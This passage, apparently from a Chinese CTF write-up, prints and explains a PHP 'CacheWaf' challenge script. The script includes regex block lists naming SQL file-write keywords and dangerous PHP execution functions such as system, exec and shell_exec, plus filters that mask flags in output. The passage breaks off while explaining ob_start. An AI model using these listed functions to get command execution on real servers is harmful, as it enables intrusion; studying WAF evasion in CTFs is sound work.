class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-comment">//config</span><br><span class="hljs-variable">$sql_blacklist</span> = <span class="hljs-string">&quot;/drop\s*|dumpfile\s*|INTO FILE\s*|outfile\s*|load_file\s*|multipoint\s*/i&quot;</span>;<br><span class="hljs-variable">$rce_blacklist</span> = <span class="hljs-string">&quot;/(var_dump|str_rot13|serialize|base64_encode|base64_decode|strrev|eval|assert|file_put_contents|fwrite|curl_exec|passthru|exec|dl|readlink|popepassthru|preg_replace|create_function|array_map|call_user_func|call_user_func_array|array_filter|usort|stream_socket_server|pcntl_exec|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore|ini_set|LD_PRELOAD|ini_alter|ini_restore|ini_set)\s*\(/i&quot;</span>;<br><span class="hljs-variable">$key_blacklist</span>=<span class="hljs-string">&quot;/_GET|_POST|_COOKIE|_FILE|_SERVER|_SESSION|flag|waf/i&quot;</span>;<br><br><span class="hljs-variable">$config2333</span>=[<br>    <span class="hljs-string">&quot;cachestore&quot;</span>=&gt;<span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;flagFormat&quot;</span>=&gt;<span class="hljs-string">&quot;ROIS&quot;</span>,<span class="hljs-comment">//=&gt; /ROIS&#123;643124e14ecfc643124e14ecff&#125;/i</span><br>    <span class="hljs-string">&quot;filterFunc&quot;</span>=&gt;[<br>        <span class="hljs-string">&quot;fileterOriginFlag&quot;</span>,<br>        <span class="hljs-string">&quot;fileterBase64Flag&quot;</span><br>    ],<br>    <span class="hljs-string">&quot;filterInputRule&quot;</span>=&gt;[<br>        <span class="hljs-variable">$sql_blacklist</span>,<br>        <span class="hljs-variable">$rce_blacklist</span>,<br>        <span class="hljs-variable">$key_blacklist</span><br>    ],<span class="hljs-comment">//filter input</span><br>    <span class="hljs-string">&quot;fileFilter&quot;</span>=&gt;<span class="hljs-literal">true</span><br>];<br><br><span class="hljs-comment">//config ends</span><br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;cachestore&quot;</span>])&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(PHP_OS,<span class="hljs-string">&quot;WIN&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-comment">//Linux</span><br>        <span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;cachestore&quot;</span>]=<span class="hljs-string">&quot;/tmp/cached&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//Windows</span><br>        <span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;cachestore&quot;</span>]=<span class="hljs-string">&quot;cached&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;cachestore&quot;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;cachestore&quot;</span>]);<br>    <span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;cachestore&quot;</span>] = <span class="hljs-title function_ invoke__">realpath</span>(<span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;cachestore&quot;</span>]);<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CacheWaf</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$config2333</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$config2333</span></span>) </span>&#123;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;config2333 = <span class="hljs-variable">$config2333</span>;<br><br><br>        <span class="hljs-comment">//check cache exists</span><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">cacheExists</span>(<span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">reqid</span>());<br><br>        <span class="hljs-comment">//filter input</span><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;config2333[<span class="hljs-string">&quot;filterInputRule&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$black_list</span>)&#123;<br>            <span class="hljs-variable">$_GET</span>=<span class="hljs-title function_ invoke__">filter_arr</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-variable">$_GET</span>);<br>            <span class="hljs-variable">$_POST</span>=<span class="hljs-title function_ invoke__">filter_arr</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-variable">$_POST</span>);<br>            <span class="hljs-variable">$_COOKIE</span>=<span class="hljs-title function_ invoke__">filter_arr</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-variable">$_COOKIE</span>);<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt;&amp;<span class="hljs-variable">$value</span>)&#123;<br>                <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">strong_replace</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$value</span>);<br>            &#125;<br>            <span class="hljs-variable">$_SESSION</span>=<span class="hljs-title function_ invoke__">filter_arr</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-variable">$_SESSION</span>);<br>            <span class="hljs-variable">$_FILES</span>=<span class="hljs-title function_ invoke__">filter_arr</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-variable">$_FILES</span>);<br><br>        &#125;<br><br>        <span class="hljs-comment">//filter upload file</span><br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;config2333[<span class="hljs-string">&quot;fileFilter&quot;</span>])&#123;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$value</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>]))&#123;<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$value</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$v</span>)&#123;<br>                        <span class="hljs-variable">$fileCon</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$v</span>);<br>                        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;config2333[<span class="hljs-string">&quot;filterInputRule&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$black_list</span>)&#123;<br>                            <span class="hljs-variable">$fileCon</span> = <span class="hljs-title function_ invoke__">strong_replace</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$fileCon</span>);<br>                        &#125;<br>                        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$v</span>,<span class="hljs-variable">$fileCon</span>);<br>                    &#125;<br><br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-variable">$fileCon</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;config2333[<span class="hljs-string">&quot;filterInputRule&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$black_list</span>)&#123;<br>                        <span class="hljs-variable">$fileCon</span> = <span class="hljs-title function_ invoke__">strong_replace</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$fileCon</span>);<br>                    &#125;<br>                    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$value</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$fileCon</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">//cache start</span><br><br>        <span class="hljs-title function_ invoke__">ob_start</span>(<span class="hljs-string">&quot;cacheCtrl&quot;</span>);<br><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        @<span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cacheExists</span>(<span class="hljs-params"><span class="hljs-variable">$reqid</span></span>)</span>&#123;<br>        <span class="hljs-variable">$cacheFilePath</span>=<span class="hljs-variable language_">$this</span>-&gt;config2333[<span class="hljs-string">&quot;cachestore&quot;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$reqid</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$cacheFilePath</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$cacheFilePath</span>));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reqid</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$cookie</span> = <span class="hljs-variable">$_COOKIE</span>;<br>        <span class="hljs-variable">$get</span> = <span class="hljs-variable">$_GET</span>;<br>        <span class="hljs-variable">$requri</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;SCRIPT_NAME&quot;</span>];<br>        <span class="hljs-variable">$post</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br>        <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$value</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>]))&#123;<br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$value</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$v</span>)&#123;<br>                    <span class="hljs-variable">$fileCon</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$v</span>);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$fileCon</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>            &#125;<br>            <span class="hljs-variable">$file</span>.=<span class="hljs-variable">$fileCon</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">sort</span>(<span class="hljs-variable">$cookie</span>);<br>        <span class="hljs-title function_ invoke__">sort</span>(<span class="hljs-variable">$get</span>);<br>        <span class="hljs-variable">$idcon</span>=<span class="hljs-variable">$requri</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-variable">$cookie</span>).<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-variable">$get</span>).<span class="hljs-variable">$post</span>.<span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$idcon</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fileterOriginFlag</span>(<span class="hljs-params"><span class="hljs-variable">$buffer</span>,<span class="hljs-variable">$fakeflag</span>,<span class="hljs-variable">$flagFormat</span></span>)</span>&#123;<br>    <span class="hljs-variable">$buffer</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$flagFormat</span>.<span class="hljs-string">&quot;&#123;.*&#125;/im&quot;</span>,<br>        <span class="hljs-variable">$fakeflag</span>,<span class="hljs-variable">$buffer</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$buffer</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fileterBase64Flag</span>(<span class="hljs-params"><span class="hljs-variable">$buffer</span>,<span class="hljs-variable">$fakeflag</span>,<span class="hljs-variable">$flagFormat</span></span>)</span>&#123;<br>    <span class="hljs-variable">$base64flag</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$flagFormat</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$base64flag</span>,<span class="hljs-string">&quot;==&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-variable">$base64flag</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$base64flag</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">3</span>);<br>    &#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$base64flag</span>,<span class="hljs-string">&quot;=&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-variable">$base64flag</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$base64flag</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">2</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$buffer</span>,<span class="hljs-variable">$base64flag</span>)!==<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-variable">$buffer</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;#<span class="hljs-subst">$base64flag</span>&quot;</span>.<span class="hljs-string">&quot;[0-9a-zA-Z/+]+#&quot;</span>,<br>            <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$fakeflag</span>),<span class="hljs-variable">$buffer</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$buffer</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">strong_replace</span> (<span class="hljs-params"><span class="hljs-variable">$rule</span>,<span class="hljs-variable">$replace</span>,<span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>        <span class="hljs-variable">$tmpstr</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$rule</span>,<span class="hljs-variable">$replace</span>,<span class="hljs-variable">$str</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$tmpstr</span> === <span class="hljs-variable">$str</span>)&#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$tmpstr</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_arr</span>(<span class="hljs-params"><span class="hljs-variable">$rule</span>,<span class="hljs-variable">$arr</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$arr</span>===<span class="hljs-literal">null</span>)<span class="hljs-keyword">return</span> <span class="hljs-variable">$arr</span>;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>)&#123;<br>        <span class="hljs-comment">//filter $key</span><br>        <span class="hljs-variable">$tmpkey</span>=<span class="hljs-title function_ invoke__">strong_replace</span>(<span class="hljs-variable">$rule</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$key</span>);<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$val</span>))&#123;<br>            <span class="hljs-variable">$tmpval</span> = <span class="hljs-title function_ invoke__">filter_arr</span>(<span class="hljs-variable">$rule</span>,<span class="hljs-variable">$val</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$tmpval</span> = <span class="hljs-title function_ invoke__">strong_replace</span>(<span class="hljs-variable">$rule</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$val</span>);<br>        &#125;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$key</span>]);<br><br>        <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$tmpkey</span>] =  <span class="hljs-variable">$tmpval</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$arr</span>;<br><br>&#125;<br><br><br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cacheCtrl</span>(<span class="hljs-params"><span class="hljs-variable">$buffer</span></span>) </span>&#123;<br>    <span class="hljs-comment">//filter output</span><br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>]));<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$config2333</span>;<br>    <span class="hljs-variable">$uniqid</span> = <span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-title function_ invoke__">uniqid</span>();<br>    <span class="hljs-variable">$fakeflag</span> = <span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;flagFormat&quot;</span>].<span class="hljs-string">&quot;&#123;<span class="hljs-subst">&#123;$uniqid&#125;</span>&#125;&quot;</span>;<br>    <span class="hljs-variable">$flagFormat</span> = <span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;flagFormat&quot;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;filterFunc&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$filter</span>)&#123;<br>        <span class="hljs-variable">$buffer</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-variable">$buffer</span>,<span class="hljs-variable">$fakeflag</span>,<span class="hljs-variable">$flagFormat</span>);<br>    &#125;<br><br><br>    <span class="hljs-comment">//cahce</span><br>    <span class="hljs-variable">$cacheFilePath</span>=<span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;cachestore&quot;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title class_">CacheWaf</span>::<span class="hljs-title function_ invoke__">reqid</span>();<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$cacheFilePath</span>,<span class="hljs-variable">$buffer</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$buffer</span>;<br><br>&#125;<br><br><span class="hljs-keyword">global</span> <span class="hljs-variable">$cache23333</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$cache23333</span> === <span class="hljs-literal">null</span>)&#123;<br>    <span class="hljs-variable">$cache23333</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheWaf</span>(<span class="hljs-variable">$config2333</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>开幕雷击只能说是，一开头就被ban掉了一堆东西</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql_blacklist</span> = <span class="hljs-string">&quot;/drop\s*|dumpfile\s*|INTO FILE\s*|outfile\s*|load_file\s*|multipoint\s*/i&quot;</span>;<br><span class="hljs-variable">$rce_blacklist</span> = <span class="hljs-string">&quot;/(var_dump|str_rot13|serialize|base64_encode|base64_decode|strrev|eval|assert|file_put_contents|fwrite|curl_exec|passthru|exec|dl|readlink|popepassthru|preg_replace|create_function|array_map|call_user_func|call_user_func_array|array_filter|usort|stream_socket_server|pcntl_exec|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore|ini_set|LD_PRELOAD|ini_alter|ini_restore|ini_set)\s*\(/i&quot;</span>;<span class="hljs-comment">#rce防火墙</span><br><span class="hljs-variable">$key_blacklist</span>=<span class="hljs-string">&quot;/_GET|_POST|_COOKIE|_FILE|_SERVER|_SESSION|flag|waf/i&quot;</span>;<span class="hljs-comment">#关键字防火墙,，&quot;flag&quot;、&quot;waf&quot;均被ban</span><br></code></pre></td></tr></table></figure><p>定义了一个配置数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$config2333</span>=[<br>    <span class="hljs-string">&quot;cachestore&quot;</span>=&gt;<span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;flagFormat&quot;</span>=&gt;<span class="hljs-string">&quot;ROIS&quot;</span>,<span class="hljs-comment">//=&gt; /ROIS&#123;643124e14ecfc643124e14ecff&#125;/i</span><br>    <span class="hljs-string">&quot;filterFunc&quot;</span>=&gt;[<br>        <span class="hljs-string">&quot;fileterOriginFlag&quot;</span>,<br>        <span class="hljs-string">&quot;fileterBase64Flag&quot;</span><br>    ],<br>    <span class="hljs-string">&quot;filterInputRule&quot;</span>=&gt;[<br>        <span class="hljs-variable">$sql_blacklist</span>,<br>        <span class="hljs-variable">$rce_blacklist</span>,<br>        <span class="hljs-variable">$key_blacklist</span><br>    ],<span class="hljs-comment">//filter input</span><br>    <span class="hljs-string">&quot;fileFilter&quot;</span>=&gt;<span class="hljs-literal">true</span><br>];<br></code></pre></td></tr></table></figure><p>看到了可疑内容filterFunc(过滤方法)和filterInputRule(过滤输入)，先看下filterFunc里的两个函数分别干啥的吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fileterOriginFlag</span>(<span class="hljs-params"><span class="hljs-variable">$buffer</span>,<span class="hljs-variable">$fakeflag</span>,<span class="hljs-variable">$flagFormat</span></span>)</span>&#123;<span class="hljs-comment">#line127</span><br>    <span class="hljs-variable">$buffer</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$flagFormat</span>.<span class="hljs-string">&quot;&#123;.*&#125;/im&quot;</span>,<br>        <span class="hljs-variable">$fakeflag</span>,<span class="hljs-variable">$buffer</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$buffer</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>fileterOriginFlag(过滤原flag):传入$buffer、$fakeflag、$flagFormat，$flagFormat是”ROIS”。preg_replace()中的内容也就是把$buffer中ROIS{.*}形式的替换成假flag然后将返回的假flag赋值给$buffer，最终函数返回$buffer。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fileterBase64Flag</span>(<span class="hljs-params"><span class="hljs-variable">$buffer</span>,<span class="hljs-variable">$fakeflag</span>,<span class="hljs-variable">$flagFormat</span></span>)</span>&#123;<span class="hljs-comment">#line133</span><br>    <span class="hljs-variable">$base64flag</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$flagFormat</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$base64flag</span>,<span class="hljs-string">&quot;==&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-variable">$base64flag</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$base64flag</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">3</span>);<br>    &#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$base64flag</span>,<span class="hljs-string">&quot;=&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-variable">$base64flag</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$base64flag</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">2</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$buffer</span>,<span class="hljs-variable">$base64flag</span>)!==<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-variable">$buffer</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;#<span class="hljs-subst">$base64flag</span>&quot;</span>.<span class="hljs-string">&quot;[0-9a-zA-Z/+]+#&quot;</span>,<br>            <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$fakeflag</span>),<span class="hljs-variable">$buffer</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$buffer</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>其实和fileterOriginFlag()的作用差不多，但是多了一些截取base64编码中非”&#x3D;&#x3D;”和”&#x3D;”的部分的步骤。总体的意思也是将base64形式的flag替换成假的flag。</p><p>接下来看看这两个函数在waf中的位置，单独查函数名查不到，查filterFunc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cacheCtrl</span>(<span class="hljs-params"><span class="hljs-variable">$buffer</span></span>) </span>&#123;<span class="hljs-comment">#line180</span><br>    <span class="hljs-comment">//filter output</span><br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>]));<span class="hljs-comment">#chdir()改变当前目录，dirname()返回绝对路径，$_SERVER[&#x27;SCRIPT_FILENAME&#x27;]为当前执行脚本的绝对路径。(https://www.php.net/manual/zh/reserved.variables.server.php)</span><br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$config2333</span>;<br>    <span class="hljs-variable">$uniqid</span> = <span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-title function_ invoke__">uniqid</span>();<span class="hljs-comment">#uniqid()基于以微秒计的当前时间，生成一个唯一的 ID。</span><br>    <span class="hljs-variable">$fakeflag</span> = <span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;flagFormat&quot;</span>].<span class="hljs-string">&quot;&#123;<span class="hljs-subst">&#123;$uniqid&#125;</span>&#125;&quot;</span>;<br>    <span class="hljs-variable">$flagFormat</span> = <span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;flagFormat&quot;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;filterFunc&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$filter</span>)&#123;<br>        <span class="hljs-variable">$buffer</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-variable">$buffer</span>,<span class="hljs-variable">$fakeflag</span>,<span class="hljs-variable">$flagFormat</span>);<br>    &#125;<span class="hljs-comment">#依次执行那两个过滤函数</span><br></code></pre></td></tr></table></figure><p>然后看下这个cacheCtrl()在waf中的作用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ob_start</span>(<span class="hljs-string">&quot;cacheCtrl&quot;</span>);<span class="hljs-comment">#line88</span><br></code></pre></td></tr></table></figure><p>去学习了下php中的<a href="https://www.php.net/manual/zh/function.ob-start.php">ob_start()</a>：</p><p>ob_start — 